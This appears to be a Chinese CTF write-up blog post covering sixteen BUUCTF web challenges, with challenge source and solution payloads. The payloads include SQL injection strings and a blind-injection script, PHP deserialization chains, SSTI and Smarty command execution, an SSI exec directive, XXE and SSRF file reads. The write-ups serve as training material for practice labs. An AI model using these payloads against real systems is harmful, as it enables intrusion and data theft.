---
title: BUUCTF(三)
categories: ctf题目
---

# 前言
BUUCTF web 第二页 下半部分16题

---

<!--more-->
---
# [CISCN 2019 初赛]Love Math

```php
<?php 
error_reporting(0); 
//听说你很喜欢数学，不知道你是否爱它胜过爱flag 
if(!isset($_GET['c'])){ 
    show_source(__FILE__); 
}else{ 
    //例子 c=20-1 
    $content = $_GET['c']; 
    if (strlen($content) >= 80) { 
        die("太长了不会算"); 
    } 
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]']; 
    foreach ($blacklist as $blackitem) { 
        if (preg_match('/' . $blackitem . '/m', $content)) { 
            die("请不要输入奇奇怪怪的字符"); 
        } 
    } 
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; 
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);   
    foreach ($used_funcs[0] as $func) { 
        if (!in_array($func, $whitelist)) { 
            die("请不要输入奇奇怪怪的函数"); 
        } 
    } 
    //帮你算出答案 
    eval('echo '.$content.';'); 
}
```

![](https://img-blog.csdnimg.cn/20210616162033921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [安洵杯 2019]easy_serialize_php
- 反序列化字符串逃逸

```ph
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

![](https://img-blog.csdnimg.cn/2021061616211840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到最后调用了file_get_contents函数，`$userinfo`通过`$serialize_info`反序列化的到，`$serialize_info`通过对`$_SESSION`序列化再过滤后得到

总之我们要让base64_decode(`$userinfo['img']`)=d0g3_f1ag.php

也就是`$userinfo['img']`=ZDBnM19mMWFnLnBocA==

但是在这里：

```ph
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}
```

如果直接传入，会进行sha1处理，自然无法利用


```
extract会导致变量覆盖
```

filter函数会将`’php’,‘flag’,‘php5’,‘php4’,'fl1g’`等关键字替换成空导致长度少导致逃逸。

键逃逸例子：
```
a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

结果：

```
Array
(
    [phpflag] => ;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
    [img] => Z3Vlc3RfaW1nLnBuZw==
)
```

Filter之后：
```
a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

结果：

```
Array
(
    [";s:48:] => 1
    [img] => ZDBnM19mMWFnLnBocA==
)
```

尝试构造：

首先构造所需字符串：


![](https://img-blog.csdnimg.cn/20210616162510469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
反序列化进行进一步构造

![](https://img-blog.csdnimg.cn/20210616162544186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
经过filter后需要补上  `;s:1:"1";` 测试成功：

![](https://img-blog.csdnimg.cn/20210616162618786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
所以在序列化字符串时需要加上我们所补全的字符串：

![](https://img-blog.csdnimg.cn/20210616162631442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Post：
```
_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:" ZDBnM19mMWFnLnBocA== ";}
```

得到提示`$flag = 'flag in /d0g3_fllllllag';`

Base64后长度也是20，不需要在进行修改

值逃逸，放两张图比较吧：

![](https://img-blog.csdnimg.cn/20210616162704552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20210616162709474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [SUCTF 2019]Pythonginx

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```

函数解释：
```python
>>> from urllib import parse
>>> url = 'http://www.example.com/a?b&c=1#2'
>>> host = parse.urlparse(url).hostname	#urlparse对url进行分割，host等于其中的hostname
>>> parse.urlparse(url)					#查看一下效果
ParseResult(scheme='http', netloc='www.example.com', path='/a', params='', query='b&c=1', fragment='2')
>>> host								#查看host的内容
'www.example.com'
>>> parts = list(parse.urlsplit(url))	#同样的，urlsplit也是分割url，并保存为列表
>>> parts								#查看一下效果
['http', 'www.example.com', '/a', 'b&c=1', '2']
>>> host = parts[1]						#相当于也是取其中的hostname
>>> host
'www.example.com'
>>> finalUrl = parse.urlunsplit(parts).split(' ')[0]	#urlunsplit拼接为url
>>> finalUrl											#查看一下效果
'http://www.example.com/a?b&c=1#2'
>>>
```

```ph
CVE-2019-9636：urlsplit 不处理 NFKC 标准化
CVE-2019-10160：urlsplit NFKD 标准化漏洞

漏洞原理：
用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 URL。
例如，在直接比较中，\ uFF03不等于'＃'，而是统一化为'＃'，这会更改 URL 的片段部分。类似地，\ u2100 统一化为'a/c'，它引入了路径段。
```

脚本：

```python
from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni=chr(x)
        url="http://suctf.c{}".format(uni)
        try:
            if getUrl(url):
                print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
        except:
            pass
 
def getUrl(url):
    url=url
    host=parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts=list(urlsplit(url))
    host=parts[1]
    if host == 'suctf.cc':
        return False
    newhost=[]
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1]='.'.join(newhost)
    finalUrl=urlunsplit(parts).split(' ')[0]
    host=parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False
 
 
if __name__=='__main__':
    get_unicode()
```

payload:
```
file://suctf.cⅭ/usr/local/nginx/conf/nginx.conf
file://suctf.cⅭ/usr/fffffflag
```

贴上另外部分nginx的配置文件所在位置

```ph
配置文件： /usr/local/nginx/conf/nginx.conf
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
```

因此我们先去读取配置文件

/getUrl?url=file://suctf.cℂ/../../../../../usr/local/nginx/conf/nginx.conf

发现flag路径，直接读取

[wp](https://blog.csdn.net/qq_45691294/article/details/108783044)

---
# [WesternCTF2018]shrine

- SSTI
- config的替换


```python
import flask 
import os 
app = flask.Flask(__name__) 
app.config['FLAG'] = os.environ.pop('FLAG')  # 注册了一个名为FLAG的config
@app.route('/') 
def index(): 
    return open(__file__).read() 
@app.route('/shrine/')  # 路径，这里设置了shrine路由，这里可能会实现ssti
def shrine(shrine): 
    def safe_jinja(s): 
        s = s.replace('(', '').replace(')', '') 
        blacklist = ['config', 'self']  # 黑名单
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s  # 遍历黑名单将结果为空
    return flask.render_template_string(safe_jinja(shrine)) 
if __name__ == '__main__': 
app.run(debug=True)
```

接下来我们使用 {{config}} 查看一下配置文件，这样app.config也就可以看到了。

不过在这道题当中设置了黑名单，过滤了 config 与 self ，不然我们可以使用config，传入 config，或者使用self传入 `{{self.dict}}`，不过，这道题是不行了。

但是在python里，有许多内置函数，其中有一个 url_for ，其作用是给指定的函数构造 URL。配合globals()，`该函数会以字典类型返回当前位置的全部全局变量`。这样也可以实现查看的效果

```
 /shrine/{{url_for.__globals__}} 
```

![](https://img-blog.csdnimg.cn/20210616163832116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
`current_app': <Flask 'app'>`这里的current就是指的当前的app，这样我们只需要能查看到这个的config不就可以看到flag了，那么构造

payload：
```
/shrine/{{url_for.__globals__['current_app'].config}}
```


---
# [0CTF 2016]piapiapia

单独有一篇博客


---
# [WUSTCTF2020]朴实无华
![](https://img-blog.csdnimg.cn/20210616164017558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Robots.txt发现/fAke_f1agggg.php

发现fl4g.php 访问查看相应内容

![](https://img-blog.csdnimg.cn/2021061616405486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
fl4g.php:
```ph

Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/fl4g.php:2) in /var/www/html/fl4g.php on line 3
<img src="/img.jpg">
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
去非洲吧
```

md5等于本身绕过：
```
md5('0e215962017') ==> “0e291242476940776845150308577824”
```

---
# *****[SWPU2019]Web1
- 无列名注入
- 过滤information_schema

[bypass 绕过information_schema](https://www.anquanke.com/post/id/193512)

[无列名注入](https://www.jianshu.com/p/6eba3370cfab)


--
Mysql5.6及以上版本中 `innodb_index_stats `  和`innodb_table_stats ` 这两个表中都包含所有 `新创建的数据库和表名`

注意：

![](https://img-blog.csdnimg.cn/20210616164953743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
先注册

![](https://img-blog.csdnimg.cn/20210616165012450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


登陆后

![](https://img-blog.csdnimg.cn/20210616165019135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到这里应该是一个xss注入，因为之前尝试登录管理员密码错误，说明存在管理员

![](https://img-blog.csdnimg.cn/20210616165056329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
测试，无过滤，一个xss打过去，半天没有回响，还是我太年轻了

竟是一个sql注入

打了 `1’` 出现sql报错

![](https://img-blog.csdnimg.cn/20210616165143691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

1' union select 1,2,'3
发现空格全部消失，/**/代替

![](https://img-blog.csdnimg.cn/20210616165215200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
数据库为`web1`，`过滤了information_schema`

bypass information_schema是利用的`sys.schema_auto_increment_columns` 库来进行查询

buuoj的平台没有 sys.schema_auto_increment_columns 这个库，而且一般要超级管理员才可以访问sys

所以一般还可以用这个方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021061616550155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
当过滤了information_schema时，可以用`mysql.innodb_table_stats`代替

payload:
```
'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```
得到库名:

![](https://img-blog.csdnimg.cn/20210616165729854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
知道表名了，不知道列名怎么办

无列名注入：

注意，在无列名注入的时候 一定要和表的列数相同 不然会报错 慢慢试。。最后发现users里有三列，猜测对应 id name passwd

payload:(去掉了/**/)
```
' union select 1,(select group_concat(a) from (select 1,2 as a,3 as b union select * from users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 '
```
末尾的 a 是用来命名的，也可以是其他字符。

![](https://img-blog.csdnimg.cn/20210616170000291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

那么对应的查passwd那一列：
```
' union select 1,(select group_concat(b) from (select 1,2 as a,3 as b union select * from users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 '
```

![](https://img-blog.csdnimg.cn/20210616170119724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [MRCTF2020]PYWebsite
![](https://img-blog.csdnimg.cn/2021061617020253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
去/flag.php看一看

抓包加一个XFF即可

---
# [极客大挑战 2019]FinalSQL
- 异或注入

脚本：
```python
import requests
import time

url = "http://c7f4deb2-e4eb-4cec-a2b4-6014fb5b6c2d.node3.buuoj.cn/search.php?"
temp = {"id" : ""}
column = ""
for i in range(1,1000):
    time.sleep(0.06)
    low = 32
    high =128
    mid = (low+high)//2
    while(low<high):
        #库名
        temp["id"] = "1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1" %(i,mid)
        #表名
        #temp["id"] = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1" %(i,mid)
        #字段名
        #temp["id"] = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1" %(i,mid)
        #内容
        #temp["id"] = "1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" %(i,mid)
        r = requests.get(url,params=temp)
        time.sleep(0.04)
        print(low,high,mid,":")
        if "Click" in r.text:
            low = mid+1
        else:
            high = mid
        mid =(low+high)//2
    if(mid ==32 or mid ==127):
        break
    column +=chr(mid)
    print(column)
    
print("All:" ,column)
```

---
# [NPUCTF2020]ReadlezPHP
```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);

```

反序列化
```php
<?php
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "phpinfo()";
        $this->b = "assert";
   
}
}
$c = new HelloPhp();

echo serialize($c);

?>
```

---
# **[MRCTF2020]Ezpop
- 反序列化

```ph
Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

```
__construct   当一个对象创建时被调用，
__toString   当一个对象被当作一个字符串被调用。
__wakeup()   使用unserialize时触发
__get()    用于从不可访问的属性读取数据
#难以访问包括：（1）私有属性，（2）没有初始化的属性
__invoke()   当脚本尝试将对象调用为函数时触发
```


- 根据以上题目，当用get方法传一个pop参数后，会自动调用Show类的_wakeup()魔术方法。

- _wakeup()通过preg_match()将`$this->source`做字符串比较，如果$this->source是Show类，就调用了__toString()方法；

- 如果__toString()其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的_get()方法。

- 如果_get()中的p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的_invoke()方法。

- 利用文件包含漏洞，使用_invoke()读取flag.php的内容。

2021强网杯赌徒的payload:
```php
class Start
{
   public $name;
}

class Room
{
    public $filename='/etc/hint';  //换为 /flag可以直接读
}

class Info
{
    public function __construct(){
        $this->file['filename']=new Room();
}

$a = new Start();
$a->name = new Info();
$a->name->file['filename']->a=new Room();

echo urlencode(serialize($a));
```

---
# [BJDCTF2020]EasySearch
- shtml 漏洞
- Apache SSI 远程命令执行漏洞

扫路径：

index.php.swp

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

爆破md5：

```python
import hashlib

for i in range(99999999):
    a=hashlib.md5(str(i).encode('utf-8')).hexdigest()
    b=a[0:6]
    if b =='6d0bc1':
        print(i)
 
```

进去后抓包：

![](https://img-blog.csdnimg.cn/20210616171445755.png#pic_center)

发现一个shtml 后缀

访问：

![](https://img-blog.csdnimg.cn/20210616171518802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

用到的是 Apache SSI 远程命令执行漏洞

[SSI注入漏洞](https://blog.csdn.net/qq_40657585/article/details/84260844)

Ssi介绍：
>SSI（服务器端包含）是放置在HTML页面中的指令，并在服务页面时在服务器上对其进行评估。它们使您可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。

那么我们就可以用SSI的特性来上传一个shtml文件

其中内容是：
```
<!--#exec cmd="whoami" -->
```
回到题目，看到只有用户名这里可控，抓包，返回登陆在用户名处测试

![](https://img-blog.csdnimg.cn/20210616172441132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [NCTF2019]True XML cookbook
直接fake 那道题payload用，可以读取到passwd
但是没有/flag 文件

```
<!DOCTYPE cys[
<!ENTITY xxe SYSTEM "file:///proc/net/arp">
]>
<user><username>&xxe;</username><password>1</password></user>
```

Wp：这题是读`/etc/hosts`或者 `/proc/net/arp`来获得内网ip

读到一个10.0.118.2

![](https://img-blog.csdnimg.cn/20210616172644906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
http访问爆破一下，在11发现flag

![](https://img-blog.csdnimg.cn/20210616172701165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
关于内网ip文件
```
/etc/hosts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/net/dev
/proc/net/fib_trie
```

---
# [GYCTF2020]FlaskApp
![](https://img-blog.csdnimg.cn/20210616172755193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

报错

![](https://img-blog.csdnimg.cn/20210616172806895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

加密处{{config}}，解密处回显，确定注入点

02:42:ac:10:96:ed
0242ac1096ed

ae3781b7ab3832818645986b0b0f809e60f57732e1ab01408763e084b533e8b1

![](https://img-blog.csdnimg.cn/20210616172830504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
有点复杂：
[[GYCTF2020]FlaskApp_SopRomeo的博客-CSDN博客](https://blog.csdn.net/SopRomeo/article/details/105875248)

[[GYCTF2020]FlaskApp_missht0的博客-CSDN博客](https://blog.csdn.net/missht0/article/details/113482195)

---
# [CISCN2019 华东南赛区]Web11

Smarty注入  {if system('cat /flag')}{/if}

